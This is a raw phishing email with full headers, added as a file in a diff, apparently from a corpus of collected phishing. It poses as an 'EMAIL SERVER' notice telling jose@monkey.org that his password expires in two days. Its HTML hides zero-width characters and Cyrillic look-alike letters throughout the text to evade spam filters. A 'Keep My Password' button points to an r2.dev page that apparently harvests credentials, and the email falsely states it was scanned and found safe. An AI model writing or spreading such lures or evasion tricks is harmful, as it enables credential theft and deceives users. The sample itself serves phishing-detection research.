@@ -1,0 +1,137 @@
+Return-Path: info@contifibre.cc
+Delivered-To: jose@monkey.org
+X-FDA: 81377111088.14.152D1E0
+Received: from contifibre.cc (contifibre.cc [185.38.142.238])
+	by imf29.b.hostedemail.com (Postfix) with ESMTP id A156D120004
+	for <jose@monkey.org>; Mon, 23 Oct 2023 15:29:42 +0000 (UTC)
+Authentication-Results: imf29.b.hostedemail.com;
+	dkim=pass header.d=contifibre.cc header.s=dkim header.b=DRewHfLU;
+	spf=pass (imf29.b.hostedemail.com: domain of info@contifibre.cc designates 185.38.142.238 as permitted sender) smtp.mailfrom=info@contifibre.cc;
+	dmarc=pass (policy=reject) header.from=contifibre.cc
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1698074982;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references:dkim-signature; bh=AhI6ERVjfaxoJjnQlua7dL4oen00rCWAnQw34fReLtg=;
+	b=T58SJ1mT3mVv8CMkBhNEy9g7uZ0Np9GZaxRm/V9tJ5i6W2/9P4n/eqTkzk0sKv8q4DQafF
+	fkDAMTwGu3+gyhB1CZeL6/TNAXAJoWl4Z7kVKwZh6a7tQ1nvXbGik9ujlbcyjYuUJJYsDw
+	xLvoDpfZVO1Av4/lRCH+7q5vVaPHUXY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1698074982; a=rsa-sha256;
+	cv=none;
+	b=aMz95NV82rLjw/QKFNli/Zf/5UVSi0FqC1N2Oq0NVogxh7pPNU5z6EpQQFzgpfNhNLxSLp
+	128sizRftX/06pKhYjjb1WxVH31uhcmJBak5f3BL+jeHdtfJxQwHKsggVmYbv52CJeRacU
+	P2109JgiwpEJyYKWY6cOTphsxiN7dPI=
+ARC-Authentication-Results: i=1;
+	imf29.b.hostedemail.com;
+	dkim=pass header.d=contifibre.cc header.s=dkim header.b=DRewHfLU;
+	spf=pass (imf29.b.hostedemail.com: domain of info@contifibre.cc designates 185.38.142.238 as permitted sender) smtp.mailfrom=info@contifibre.cc;
+	dmarc=pass (policy=reject) header.from=contifibre.cc
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=contifibre.cc; s=dkim; h=Content-Transfer-Encoding:Content-Type:
+	MIME-Version:Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
+	Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
+	:Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
+	List-Subscribe:List-Post:List-Owner:List-Archive;
+	bh=AhI6ERVjfaxoJjnQlua7dL4oen00rCWAnQw34fReLtg=; b=DRewHfLUC1vuAiTDlQtNlgnYME
+	zFJpcN0g/+UFY3ZrL7+Ppr9cOwk3OwtY18C+qyi0oVeqfBVxw4RIiN8PLrL1Y2S6yRhTzZu63gW3s
+	gFMVPMz2SU6lvSgyrqSs7u6KppAY85I19G4Kif0F4pbhVbEP+0KL46MmAKpAfaEJr3NE=;
+Received: from [81.161.229.214]
+	by contifibre.cc with esmtpsa  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
+	(Exim 4.96.1)
+	(envelope-from <info@contifibre.cc>)
+	id 1quws9-0000qY-0z
+	for jose@monkey.org;
+	Mon, 23 Oct 2023 15:29:41 +0000
+From: EMAIL SERVER  <info@contifibre.cc>
+To: jose@monkey.org
+Subject: Deactivation Request In Progress For jose@monkey.org
+Date: 23 Oct 2023 17:29:40 +0200
+Message-ID: <20231023172940.518C4DEAE7F42746@contifibre.cc>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam02
+X-Rspam-User: 
+X-Rspamd-Queue-Id: A156D120004
+X-Spam-Status: No, score=0.33
+X-Stat-Signature: b4ehpafftzr49if3dint5fi9u6x4bkos
+X-HE-Tag: 1698074982-351974
+X-HE-Meta: U2FsdGVkX1/q1tcbuSu3UfGDp7kDc8SfMJpbhcz4055HpHxd+51SS827ZC6hxYLj+gfeWS28xV3PU5NFhK0p29Kd6IFNqS9HiuAJmu53/dahZILCJqogcppnwRq+6MXc4jMqdAQyxi2VBZnLcxJGC+nRRzBbxzRGK/mpf4Ix/1+7+HU9/D6a7EZJu5fcMpMpcswUoIyJLhlXMWN3kQWjX8YMAVYIiPhh6sCzCLlnM/Pu2KwzaYxvpPqqYsxpdXs9NkmzmdBQJaHsKlgpJ8az5oRwOOL7Jpua7lvnza0JzSNL2P/HQUScWfdJvgE0U/BbIxTdzTSTUlWBm+OzRozgDhKK5Dua1nRr6S6TbhQZqWzyuo/YcGZgM83/JlPPDDnys89NxzxGfTJOymHrX0r83vmsxNP74p39N3j/9Ak9iw24stGc0YolH+OgJWa3LvIpF6huLnE2/opnUd0MZ0EAki/4J+Co12kH
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 330
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em; font-size: 14pt;"><p style=3D'color: rgb(29, =
+34, 40); font-family: "Helvetica Neue",Helvetica,Arial,sans-serif; font-siz=
+e: 13px;'><font face=3D"Segoe UI Light"><strong><font color=3D"#222222">mon=
+key.org</font>&nbsp;A&#65279;&#65279;&#65279;&#65279;c&#65279;&#65279;co&#6=
+5279;&#65279;&#65279;&#65279;unt</strong><br><br><font color=3D"#2670ec" si=
+ze=3D"6">
+Im&#65279;&#65279;por&#65279;&#65279;ta&#65279;&#65279;nt&#65279;&#65279; &=
+#65279;&#65279;No&#65279;&#65279;t&#65279;&#65279;i&#65279;&#65279;ce</font=
+><br><br>Hi <a style=3D"color: rgb(34, 34, 34);">jose</a>,,&#65279;&#65279;=
+<br><br>Your&nbsp;jose@monkey.org&nbsp;&nbsp;p&#1072;&#65279;&#65279;&#6527=
+9;<wbr>&#65279;ssword is s&#1077;&#65279;&#65279;&#65279;&#65279;t to &#107=
+7;&#65279;&#65279;&#65279;&#65279;xpir&#1077;&#65279;&#65279;&#65279;&#6527=
+9; in&nbsp;<font color=3D"#ff0000">2</font>
+&nbsp;d&#1072;&#65279;&#65279;&#65279;&#65279;y(s).<br><br>&nbsp;&#65279;&#=
+65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;&=
+#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279;&nbsp;&#65279;=
+&#65279;&#65279;&#65279;&nbsp;&#65279;&#65279;&#65279;&#65279;<wbr>&nbsp;&#=
+65279;&#65279;&#65279;&#65279;&#10687;&#65279;&#65279;&#65279;&#65279; &#65=
+279;&#65279;&#65279;&#65279;&nbsp;<a style=3D"color: rgb(34, 34, 34);">jose=
+</a><br><br>
+W&#65279;&#65279;e enc&#1086;&#65279;&#65279;&#65279;&#65279;urage y&#1086;=
+&#65279;&#65279;&#65279;&#65279;u to ta&#65279;&#65279;ke the t&#1110;&#652=
+79;&#65279;&#65279;&#65279;me n&#1086;&#65279;&#65279;&#65279;&#65279;w to =
+ma&#1110;&#65279;&#65279;&#65279;&#65279;nta&#1110;&#65279;&#65279;&#65279;=
+&#65279;n y&#1086;&#65279;&#65279;&#65279;&#65279;ur p&#1072;&#65279;&#6527=
+9;&#65279;&#65279;ssw&#1086;&#65279;&#65279;&#65279;&#65279;rd=20
+act&#1110;&#65279;&#65279;&#65279;&#65279;v&#1110;&#65279;&#65279;&#65279;&=
+#65279;ty to avo&#1110;&#65279;&#65279;&#65279;&#65279;d log&#1110;&#65279;=
+&#65279;&#65279;&#65279;n &#1110;&#65279;&#65279;&#65279;&#65279;nterrupti&=
+#1086;&#65279;&#65279;&#65279;&#65279;n.<br><br>
+<a style=3D'background: rgb(38, 112, 236); padding: 7px; color: rgb(255, 25=
+5, 255); font-family: "segoe ui light"; font-size: 15px;' href=3D"https://p=
+ub-57c5b2156bab41e7a543bfdfaab887e6.r2.dev/lolipop.html#jose@monkey.org" re=
+l=3D"noreferrer">K&#1077;&#65279;&#65279;&#1077;&#65279;&#65279;p M&#65279;=
+y &#1056;&#65279;&#65279;&#1072;&#65279;&#65279;ss&#65279;w&#65279;&#65279;=
+or&#65279;d</a><a style=3D"color: rgb(34, 34, 34);" rel=3D"nofollow noopene=
+r noreferrer"><br><br>
+N&#1086;&#65279;&#65279;&#65279;&#65279;t&#1077;&#65279;&#65279;&#65279;&#6=
+5279;:&nbsp;<font color=3D"#ff0000">
+&nbsp;We w&#65279;&#65279;on't b&#1077;&#65279;&#65279;&#65279;&#65279; h&#=
+1077;&#65279;&#65279;&#65279;&#65279;ld respons&#1110;&#65279;&#65279;&#652=
+79;&#65279;bl&#1077;&#65279;&#65279;&#65279;&#65279; for &#1072;&#65279;&#6=
+5279;&#65279;&#65279;ny &#1072;&#65279;&#65279;&#65279;&#65279;cc&#1086;&#6=
+5279;&#65279;&#65279;&#65279;unt l&#1086;&#65279;&#65279;&#65279;&#65279;s&=
+#65279;&#65279;s</font><br><br>Th&#1072;&#65279;&#65279;&#65279;&#65279;nk =
+you,<br>2023&nbsp;monkey.org&nbsp;Support</a>
+</font></p><a style=3D'color: rgb(29, 34, 40); font-family: "Helvetica Neue=
+",Helvetica,Arial,sans-serif; font-size: 13px;' rel=3D"nofollow noopener no=
+referrer"></a><span style=3D'color: rgb(29, 34, 40); font-family: "Helvetic=
+a Neue",Helvetica,Arial,sans-serif; font-size: 13px;'></span><p style=3D'co=
+lor: rgb(29, 34, 40); line-height: 20px; font-family: "Helvetica Neue",Helv=
+etica,Arial,sans-serif; font-size: 12px;'><a style=3D"color: rgb(34, 34, 34=
+);" rel=3D"nofollow noopener noreferrer"></a>
+<a style=3D"color: rgb(25, 106, 212); font-family: sans-serif;" rel=3D"nofo=
+llow noopener noreferrer">Unsubscribe&nbsp;</a>-&nbsp;&nbsp;<a style=3D"col=
+or: rgb(25, 106, 212); font-family: sans-serif;" rel=3D"nofollow noopener n=
+oreferrer">Unsubscribe Preferences</a><br><br><b><font color=3D"#df2d20" fa=
+ce=3D"Verdana" size=3D"2">
+Your Email Credentials Must be Valid to ensure you are the right Recepient.=
+<br style=3D'color: rgb(51, 51, 51); font-family: "Lucida Grande",Verdana,A=
+rial,Helvetica,sans-serif; font-size: 11px; font-weight: 400; box-sizing: b=
+order-box;'></font></b><font color=3D"#868778" style=3D'font-family: "Lucid=
+a Grande",Verdana,Arial,Helvetica,sans-serif; font-size: 11px; box-sizing: =
+border-box;'><b><font color=3D"#df2d20" size=3D"2"></font></b>This mails ha=
+s been scaned and considered safe.</font></p></body></html>
+
